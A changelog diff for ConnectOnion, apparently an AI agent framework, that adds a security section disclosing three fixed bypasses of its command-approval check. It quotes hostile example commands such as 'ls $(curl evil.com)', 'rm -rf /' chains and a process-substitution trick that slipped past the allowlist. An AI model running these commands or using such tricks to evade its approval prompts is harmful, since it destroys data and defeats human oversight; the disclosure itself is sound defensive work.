@@ -14,6 +14,16 @@ All notable changes to ConnectOnion will be documented in this file.
 - **`co ai` and the project templates drive the browser through `co browser`** rather than 40 in-process tools — one browser story instead of two.
 - **Deploy polls the full build window** and validates the project name locally before uploading, so a typo fails fast instead of halfway through a build.
 
+### 🔒 Security
+
+Three holes in the command-approval path, each reproduced on `main` before the fix and confirmed closed after. If you rely on `co ai`'s approval prompts or on a `.co/host.yaml` allowlist, this is the release to take.
+
+- **Shell control syntax bypassed the safe-command check entirely.** `_is_safe` matched a prefix and stopped looking, so `ls; rm -rf /tmp/x`, `cat f | sh`, `ls $(curl evil.com)` and `ls && rm -rf /` were all classified read-only and ran with no prompt. (#266)
+- **Commands inside process substitutions were never seen.** `echo x > >(rm -rf /)` extracted as just `echo`, so an allowlisted `echo` carried the `rm` through unchecked. (#155)
+- **`Bash(git *)` matched any binary starting with those letters** — `gitleaks`, `github-cli` — because the wildcard compared a bare prefix with no word boundary. (#156)
+
+Thanks to @failsafesecurity for all three.
+
 ### 🐛 Bug Fixes
 - The `[env]` diagnostic only prints when stderr is a terminal, so it no longer pollutes piped output.
 - A live daemon's socket is no longer unlinked on a non-refusal `OSError`.
